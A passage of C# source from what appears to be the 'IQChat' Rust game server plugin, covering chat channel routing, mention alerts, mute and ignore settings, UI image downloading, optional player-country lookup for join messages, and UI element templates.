            
            if (channel == Chat.ChatChannel.Global)
            {
                foreach (BasePlayer p in BasePlayer.activePlayerList)
                {
                    if (OutMessage.Contains("@"))
                    {
                        String SplittedName = OutMessage.Substring(OutMessage.IndexOf('@')).Replace("@", "").Split(' ')[0];
        
                        BasePlayer playerTags = GetPlayerNickOrID(SplittedName);

                        if (playerTags != null)
                        {
                            User InfoP = UserInformation[playerTags.userID];

                            if (InfoP.Settings.TurnAlert && p == playerTags)
                            {
                                ReplySystem(p, $"<size=16>{OutMessage.Trim()}</size>", GetLang("IQCHAT_FUNCED_ALERT_TITLE", p.UserIDString), p.UserIDString, ControllerMessages.GeneralSetting.AlertFormat.AlertPlayerColor);
                                if (InfoP.Settings.TurnSound)
                                    Effect.server.Run(ControllerMessages.GeneralSetting.AlertFormat.SoundAlertPlayer, playerTags.GetNetworkPosition());
                            }
                            else p.SendConsoleCommand("chat.add", new object[] { (int)channel, RenameID, OutMessage });
                        }
                        else p.SendConsoleCommand("chat.add", new object[] { (int)channel, RenameID, OutMessage });
                    }
                    else p.SendConsoleCommand("chat.add", new object[] { (int)channel, RenameID, OutMessage });

                    p.ConsoleMessage(OutMessage);
                }
            }
            if (channel == Chat.ChatChannel.Team)
            {
                RelationshipManager.PlayerTeam Team = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                if (Team == null) return;
                foreach (var FindPlayers in Team.members)
                {
                    BasePlayer TeamPlayer = BasePlayer.FindByID(FindPlayers);
                    if (TeamPlayer == null) continue;

                    TeamPlayer.SendConsoleCommand("chat.add", channel, RenameID, OutMessage);
                }
            }
            if (channel == Chat.ChatChannel.Cards)
            {
                if (!player.isMounted)
                    return;

                CardTable cardTable = player.GetMountedVehicle() as CardTable;
                if (cardTable == null || !cardTable.GameController.PlayerIsInGame(player))
                    return;

                List<Network.Connection> PlayersCards = new List<Network.Connection>();
                cardTable.GameController.GetConnectionsInGame(PlayersCards);
                if (PlayersCards == null || PlayersCards.Count == 0)
                    return;

                foreach (Network.Connection PCard in PlayersCards)
                {
                    BasePlayer PlayerInRound = BasePlayer.FindByID(PCard.userid);
                    if (PlayerInRound == null) return;
                    PlayerInRound.SendConsoleCommand("chat.add", channel, RenameID, OutMessage);
                }
            }
        }


                
        
        
        private class ImageUi
        {
            private static Coroutine coroutineImg = null;
            private static Dictionary<string, string> Images = new Dictionary<string, string>();
            public static void DownloadImages() { coroutineImg = ServerMgr.Instance.StartCoroutine(AddImage()); }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            private static IEnumerator AddImage()
            {
                _.PrintWarning(LanguageEn ? "Generating interface, wait ~10-15 seconds!" : "Генерируем интерфейс, ожидайте ~10-15 секунд!");
		   		 		  						  	   		  	  			  	  			  	   		  		  
                foreach (String Key in _.KeyImages)
                {
                    string uri = $"https://iqsystem.skyplugins.ru/iqchat/getimageui/{Key}/WIwsqNNWF7nN";
                    UnityWebRequest www = UnityWebRequestTexture.GetTexture(uri);
                    yield return www.SendWebRequest();

                    if (_ == null)
                        yield break;
                    if (www.isNetworkError || www.isHttpError)
                    {
                        _.PrintWarning(string.Format("Image download error! Error: {0}, Image name: {1}", www.error, Key));
                        www.Dispose();
                        coroutineImg = null;
                        yield break;
                    }
                    Texture2D texture = DownloadHandlerTexture.GetContent(www);
                    if (texture != null)
                    {
                        byte[] bytes = texture.EncodeToPNG();

                        var image = FileStorage.server.Store(bytes, FileStorage.Type.png, CommunityEntity.ServerInstance.net.ID).ToString();
                        if (!Images.ContainsKey(Key))
                            Images.Add(Key, image);
                        else
                            Images[Key] = image;
                        UnityEngine.Object.DestroyImmediate(texture);
                    }

                    www.Dispose();
                    yield return CoroutineEx.waitForSeconds(0.02f);
                }
                coroutineImg = null;

                _interface = new InterfaceBuilder();
                _.PrintWarning(LanguageEn ? "Interface loaded successfully!" : "Интерфейс успешно загружен!");
            }

            public static string GetImage(String ImgKey)
            {
                if (Images.ContainsKey(ImgKey))
                    return Images[ImgKey];
                return _.GetImage("LOADING");
            }

            public static void Unload()
            {
                coroutineImg = null;
                foreach (var item in Images)
                    FileStorage.server.RemoveExact(uint.Parse(item.Value), FileStorage.Type.png, CommunityEntity.ServerInstance.net.ID, 0U);
            }
        }
        public class User
        {
            public Information Info = new Information();
            public Setting Settings = new Setting();
            public Mute MuteInfo = new Mute();
            internal class Information
            {
                public String Prefix;
                public String ColorNick;
                public String ColorMessage;
                public String Rank;

                public List<String> PrefixList = new List<String>();
            }

            internal class Setting
            {
                public Boolean TurnPM = true;
                public Boolean TurnAlert = true;
                public Boolean TurnBroadcast = true;
                public Boolean TurnSound = true;

                public List<UInt64> IgnoreUsers = new List<UInt64>();

                public Boolean IsIgnored(UInt64 TargetID) => IgnoreUsers.Contains(TargetID);
                public void IgnoredAddOrRemove(UInt64 TargetID)
                {
                    if (IsIgnored(TargetID))
                        IgnoreUsers.Remove(TargetID);
                    else IgnoreUsers.Add(TargetID);
                }
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            internal class Mute
            {
                public Double TimeMuteChat;
                public Double TimeMuteVoice;

                public Double GetTime(MuteType Type)
                {
                    Double TimeMuted = 0;
                    switch (Type)
                    {
                        case MuteType.Chat:
                            TimeMuted = TimeMuteChat - CurrentTime;
                            break;
                        case MuteType.Voice:
                            TimeMuted = TimeMuteVoice - CurrentTime;
                            break;
                        default:
                            break;
                    }
                    return TimeMuted;
                }
                public void SetMute(MuteType Type, Int32 Time)
                {
                    switch (Type)
                    {
                        case MuteType.Chat:
                            TimeMuteChat = Time + CurrentTime;
                            break;
                        case MuteType.Voice:
                            TimeMuteVoice = Time + CurrentTime;
                            break;
                        default:
                            break;
                    }
                }
                public void UnMute(MuteType Type)
                {
                    switch (Type)
                    {
                        case MuteType.Chat:
                            TimeMuteChat = 0;
                            break;
                        case MuteType.Voice:
                            TimeMuteVoice = 0;
                            break;
                        default:
                            break;
                    }
                }
                public Boolean IsMute(MuteType Type) => GetTime(Type) > 0;
            }
        }
        private void AlertController(BasePlayer player)
        {
            Configuration.ControllerAlert.Alert Alert = config.ControllerAlertSetting.AlertSetting;
            Configuration.ControllerAlert.AdminSession AlertSessionAdmin = config.ControllerAlertSetting.AdminSessionSetting;
            Configuration.ControllerAlert.PlayerSession AlertSessionPlayer = config.ControllerAlertSetting.PlayerSessionSetting;
            Configuration.ControllerAlert.PersonalAlert AlertPersonal = config.ControllerAlertSetting.PersonalAlertSetting;
            GeneralInformation.RenameInfo RenameInformation = GeneralInfo.GetInfoRename(player.userID);
            Configuration.ControllerMessage ControllerMessage = config.ControllerMessages;

            String DisplayName = player.displayName;

            // if (ControllerMessage.Formatting.ControllerNickname.UseNickController)
            //     foreach (String DetectedBadNick in DisplayName.Split(' '))
            //     {
            //         if (ControllerMessage.Formatting.ControllerNickname.BadNicks.Count(x => x.ToLower() == DetectedBadNick.ToLower()) > 0)
            //             DisplayName = DisplayName.Replace(DetectedBadNick, ControllerMessage.Formatting.ControllerNickname.ReplaceBadNick);
            //     }

            UInt64 UserID = player.userID;
            if (RenameInformation != null)
            {
                DisplayName = RenameInformation.RenameNick;
                UserID = RenameInformation.RenameID;
            }

            if (AlertSessionPlayer.ConnectedAlert)
            {
                if (!AlertSessionAdmin.ConnectedAlertAdmin)
                    if (player.IsAdmin) return;

                String Avatar = AlertSessionPlayer.ConnectedAvatarUse ? UserID.ToString() : String.Empty;
                String Message = String.Empty;

                if (AlertSessionPlayer.ConnectedWorld)
                {
                    webrequest.Enqueue("http://ip-api.com/json/" + player.net.connection.ipaddress.Split(':')[0], null, (code, response) =>
                    {
                        if (code != 200 || response == null)
                            return;

                        String country = JsonConvert.DeserializeObject<Response>(response).Country;

                        if (AlertSessionPlayer.ConnectionAlertRandom)
                        {
                            sb.Clear();
                            Message = sb.AppendFormat(GetMessages(player, AlertSessionPlayer.RandomConnectionAlert.LanguageMessages), DisplayName, country).ToString();
                        }
                        else Message = GetLang("WELCOME_PLAYER_WORLD", player.UserIDString, DisplayName, country);

                        if (!permission.UserHasPermission(player.UserIDString, PermissionHideConnection))
                            ReplyBroadcast(Message, "", Avatar);

                        Log($"[{player.userID}] {Message}");
                    }, this);
                }
                else
                {
                    if (AlertSessionPlayer.ConnectionAlertRandom)
                    {
                        sb.Clear();
                        Message = sb.AppendFormat(GetMessages(player, AlertSessionPlayer.RandomConnectionAlert.LanguageMessages), DisplayName).ToString();
                    }
                    else Message = GetLang("WELCOME_PLAYER", player.UserIDString, DisplayName);

                    if (!permission.UserHasPermission(player.UserIDString, PermissionHideConnection))
                        ReplyBroadcast(Message, "", Avatar);

                    Log($"[{player.userID}] {Message}");
                }
            }
            if (AlertPersonal.UseWelcomeMessage)
            {
                String WelcomeMessage = GetMessages(player, AlertPersonal.WelcomeMessage.LanguageMessages);
                ReplySystem(player, WelcomeMessage);
            }
        }

        
        private void ConsoleOrPrintMessage(BasePlayer player, String Messages)
        {
            if (player != null)
                player.ConsoleMessage(Messages);
            else PrintWarning(Messages);
        }
        
        
        
        [ChatCommand("alert")]
        private void AlertChatCommand(BasePlayer Sender, String cmd, String[] args)
        {
            if (!permission.UserHasPermission(Sender.UserIDString, PermissionAlert)) return;
            Alert(Sender, args, false);
        }      
        private void CheckValidateUsers()
        {
            Configuration.ControllerParameters Controller = config.ControllerParameter;
            Configuration.ControllerConnection ControllerConnection = config.ControllerConnect;

            List<Configuration.ControllerParameters.AdvancedFuncion> Prefixes = Controller.Prefixes.Prefixes;
            List<Configuration.ControllerParameters.AdvancedFuncion> NickColor = Controller.NickColorList;
            List<Configuration.ControllerParameters.AdvancedFuncion> ChatColor = Controller.MessageColorList;

            foreach (KeyValuePair<UInt64, User> Info in UserInformation)
            {
                if (Controller.Prefixes.TurnMultiPrefixes)
                {
                    foreach (String Prefix in Info.Value.Info.PrefixList.Where(prefixList => !Prefixes.Exists(i => i.Argument == prefixList)))
                        NextTick(() => Info.Value.Info.PrefixList.Remove(Prefix));
                }
                else
                {
                    if (!Prefixes.Exists(i => i.Argument == Info.Value.Info.Prefix))
                        Info.Value.Info.Prefix = ControllerConnection.SetupDefaults.PrefixDefault;
                }
                if (!NickColor.Exists(i => i.Argument == Info.Value.Info.ColorNick))
                    Info.Value.Info.ColorNick = ControllerConnection.SetupDefaults.NickDefault;
                
                if (!ChatColor.Exists(i => i.Argument == Info.Value.Info.ColorMessage))
                    Info.Value.Info.ColorMessage = ControllerConnection.SetupDefaults.MessageDefault;
            }
        }
        void API_ALERT_PLAYER(BasePlayer player, String Message, String CustomPrefix = null, String CustomAvatar = null, String CustomHex = null) => ReplySystem(player, Message, CustomPrefix, CustomAvatar, CustomHex);
        
        private class InterfaceBuilder
        {
            
            public static InterfaceBuilder Instance;
            public const String UI_Chat_Context = "UI_IQCHAT_CONTEXT";
            public const String UI_Chat_Context_Visual_Nick = "UI_IQCHAT_CONTEXT_VISUAL_NICK";
            public const String UI_Chat_Alert = "UI_IQCHAT_ALERT";
            public Dictionary<String, String> Interfaces;

            
            
            public InterfaceBuilder()
            {
                Instance = this;
                Interfaces = new Dictionary<String, String>();
                BuildingStaticContext();
                BuildingVisualNick();
                BuildingCheckBox();

                BuildingModerationStatic();
                BuildingMuteAllChat();
                BuildingMuteAllVoice();

                BuildingSlider();
                BuildingSliderUpdateArgument();

                BuildingDropList();
                BuildingOpenDropList();
                BuildingElementDropList();
                BuildingElementDropListTakeLine();

                BuildingAlertUI();

                BuildingMuteAndIgnore();
                BuildingMuteAndIgnorePlayerPanel();
                BuildingMuteAndIgnorePlayer();
                BuildingMuteAndIgnorePages();

                BuildingMuteAndIgnorePanelAlert();
                BuildingIgnoreAlert();
                BuildingMuteAlert();
                BuildingMuteAlert_DropList_Title();
                BuildingMuteAlert_DropList_Reason();
            }
		   		 		  						  	   		  	  			  	  			  	   		  		  
            public static void AddInterface(String name, String json)
            {
                if (Instance.Interfaces.ContainsKey(name))
                {
                    _.PrintError($"Error! Tried to add existing cui elements! -> {name}");
                    return;
                }
		   		 		  						  	   		  	  			  	  			  	   		  		  
                Instance.Interfaces.Add(name, json);
            }

            public static string GetInterface(String name)
            {
                string json = string.Empty;
                if (Instance.Interfaces.TryGetValue(name, out json) == false)
                {
                    _.PrintWarning($"Warning! UI elements not found by name! -> {name}");
                }

                return json;
            }

            public static void DestroyAll()
            {
                for (var i = 0; i < BasePlayer.activePlayerList.Count; i++)
                {
                    var player = BasePlayer.activePlayerList[i];
                    CuiHelper.DestroyUi(player, UI_Chat_Context);
                    CuiHelper.DestroyUi(player, UI_Chat_Context_Visual_Nick);
                    CuiHelper.DestroyUi(player, UI_Chat_Alert);
                    CuiHelper.DestroyUi(player, "MUTE_AND_IGNORE_PANEL_ALERT");
                }
            }

            
            
                        private void BuildingVisualNick()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = UI_Chat_Context_Visual_Nick,
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%NICK_DISPLAY%", Font = "robotocondensed-regular.ttf", FontSize = 7, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-135.769 -89.558", OffsetMax = "-12.644 -77.176" }
                }
                });

                AddInterface("UI_Chat_Context_Visual_Nick", container.ToJson());
            }
            
                        private void BuildingStaticContext()
            {
                Configuration.ControllerParameters Controller = config.ControllerParameter;
                if(Controller == null)
                {
                    _.PrintWarning("Ошибка генерации интерфейса, null значение в конфигурации, свяжитесь с разработчиком");
                    return;
                }
                CuiElementContainer container = new CuiElementContainer();
                container.Add(new CuiPanel
                {
                    CursorEnabled = true,
                    RectTransform = { AnchorMin = "1 0.5", AnchorMax = "1 0.5", OffsetMin = "-379 -217", OffsetMax = "-31 217" },
                    Image = { Color = "0 0 0 0" }
                }, "Overlay", UI_Chat_Context);

                container.Add(new CuiElement
                {
                    Name = "ImageContext",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = "%IMG_BACKGROUND%" }, 
                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "TitleLabel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 17, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-149.429 166.408", OffsetMax = "-14.788 189.564" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "DescriptionLabel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SETTING_ELEMENT%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-149.429 112.021", OffsetMax = "152.881 131.787" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "InformationLabel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%INFORMATION%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-149.429 -53.432", OffsetMax = "-32.905 -39.808" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "InformationIcon",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_INFORMATION_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-14.788 -52.12", OffsetMax = "-3.788 -41.12" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "SettingLabel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SETTINGS%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -53.432", OffsetMax = "126.125 -39.808" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "SettingIcon",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_SETTING_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "141.88 -52.12", OffsetMax = "152.88 -41.12" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "SettingPM",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SETTINGS_PM%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -70.712", OffsetMax = "126.125 -57.088" }
                }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiElement
                {
                    Name = "SettingAlertChat",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SETTINGS_ALERT%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -82.412", OffsetMax = "126.125 -68.788" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "SettingNoticyChat",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SETTINGS_ALERT_PM%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -94.412", OffsetMax = "126.125 -80.788" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "SettingSoundAlert",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SETTINGS_SOUNDS%", Font = "robotocondensed-regular.ttf", FontSize = 8, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "11.075 -106.412", OffsetMax = "126.125 -92.788" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "MuteStatus",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%MUTE_STATUS_PLAYER%", Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-143.174 -131.59", OffsetMax = "-120.611 -114.967" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "MuteStatusTitle",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%MUTE_STATUS_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 7, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-143.174 -141.429", OffsetMax = "-89.127 -132.508" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "CountIgnored",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%IGNORED_STATUS_COUNT%", Font = "robotocondensed-regular.ttf", FontSize = 7, Align = TextAnchor.UpperLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-66.98 -131.715", OffsetMax = "-11.09 -116.831" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "IgonoredTitle",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%IGNORED_STATUS_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 7, Align = TextAnchor.UpperLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-66.98 -142.04", OffsetMax = "-19.967 -132.537" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "IgnoredIcon",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_IGNORE_INFO_ICON") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-19.483 -115.225", OffsetMax = "-11.762 -107.814" }
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = $"newui.cmd action.mute.ignore open {SelectedAction.Ignore}", Color = "0 0 0 0" },
                    Text = { Text = "" }
                },  "IgnoredIcon", "CLOSE_IGNORED");

                container.Add(new CuiElement
                {
                    Name = "TitleNickPanel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%NICK_DISPLAY_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-135.769 -78.878", OffsetMax = "-85.632 -64.613" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "NickTitle",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SLIDER_NICK_COLOR_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "22.591 76.362", OffsetMax = "80.629 92.278" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "ChatMessageTitle",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SLIDER_MESSAGE_COLOR_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-136.591 9.362", OffsetMax = "-78.045 24.278" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "PrefixTitle",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiTextComponent { Text = "%SLIDER_PREFIX_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-136.591 77.362", OffsetMax = "-89.949 93.278" }
                }
                });


                container.Add(new CuiElement
                {
                    Name = "RankTitle",
                    Parent = UI_Chat_Context,
                    Components = {
                        new CuiTextComponent { Text = "%SLIDER_IQRANK_TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "22.825 9.242", OffsetMax = "81.375 25.158" }
                    }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "123.62 166", OffsetMax = "153.62 196" },
                    Button = { Close = UI_Chat_Context, Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, UI_Chat_Context, "CLOSE_UI_Chat_Context");
		   		 		  						  	   		  	  			  	  			  	   		  		  
                AddInterface("UI_Chat_Context", container.ToJson());
            }

            
                        private void BuildingCheckBox()
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "%NAME_CHECK_BOX%",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "%COLOR%", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SETTING_CHECK_BOX") },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "%OFFSET_MIN%", OffsetMax = "%OFFSET_MAX%" } 
                }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_TURNED%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                },  "%NAME_CHECK_BOX%", "CHECK_BOX_TURNED");

                AddInterface("UI_Chat_Context_CheckBox", container.ToJson());
            }
            
                        private void BuildingSlider()
            {
                CuiElementContainer container = new CuiElementContainer();
                String NameSlider = "%NAME%";

                container.Add(new CuiElement
                {
                    Name = NameSlider,
                    Parent = UI_Chat_Context,
                    Components = {
                            new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_ICON") },
                            new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "%OFFSET_MIN%" , OffsetMax = "%OFFSET_MAX%"  }
                        }
                });

                container.Add(new CuiElement
                {
                    Name = "Left",
                    Parent = NameSlider,
                    Components = {
                        new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_LEFT_ICON") },
                        new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-53.9 -4.5", OffsetMax = "-48.9 4.5" }
                    }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_LEFT_SLIDE%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                },  "Left", "LEFT_SLIDER_BTN");

                container.Add(new CuiElement
                {
                    Name = "Right",
                    Parent = NameSlider,
                    Components = {
                        new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_ELEMENT_SLIDER_RIGHT_ICON") },
                        new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "48.92 -4.5", OffsetMax = "53.92 4.5" }
                    }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiButton 
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = "%COMMAND_RIGHT_SLIDE%", Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "Right", "RIGHT_SLIDER_BTN");

                AddInterface("UI_Chat_Slider", container.ToJson());
            }      
            private void BuildingSliderUpdateArgument() 
            {
                CuiElementContainer container = new CuiElementContainer();
                String ParentSlider = "%PARENT%";
                String NameArgument = "%NAME%";

                container.Add(new CuiElement
                {
                    Name = NameArgument,
                    Parent = ParentSlider,
                    Components = {
                    new CuiTextComponent { Text = "%ARGUMENT%", Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleCenter, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-41.929 -6.801", OffsetMax = "41.929 6.801" }
                }
                });

                AddInterface("UI_Chat_Slider_Update_Argument", container.ToJson());
            }
            
            
                        private void BuildingMuteAndIgnore() 
            {
                CuiElementContainer container = new CuiElementContainer();

                container.Add(new CuiElement
                {
                    Name = "MuteAndIgnoredPanel",
                    Parent = UI_Chat_Context,
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_AND_IGNORE_PANEL")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-1007.864 -220.114", OffsetMax = "-167.374 219.063" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "TitlesPanel",
                    Parent = "MuteAndIgnoredPanel",
                    Components = { 
                    new CuiTextComponent { Text = "%TITLE%", Font = "robotocondensed-regular.ttf", FontSize = 20, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "60.217 164.031", OffsetMax = "356.114 190.962" }
                }
                });

                container.Add(new CuiElement
                {
                    Name = "IconPanel",
                    Parent = "MuteAndIgnoredPanel",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_AND_IGNORE_ICON")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "357.5 170", OffsetMax = "373.5 185"  }
                }
                });
		   		 		  						  	   		  	  			  	  			  	   		  		  
                container.Add(new CuiElement
                {
                    Name = "SearchPanel",
                    Parent = "MuteAndIgnoredPanel",
                    Components = {
                    new CuiRawImageComponent { Color = "1 1 1 1", Png = ImageUi.GetImage("IQCHAT_MUTE_AND_IGNORE_SEARCH")},
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-385.8 161.244", OffsetMax = "-186.349 192.58" }
                }
                });

                string SearchName = "";

                container.Add(new CuiElement
                {
                    Parent = "SearchPanel",
                    Name = "SearchPanel" + ".Input.Current",
                    Components =
                {
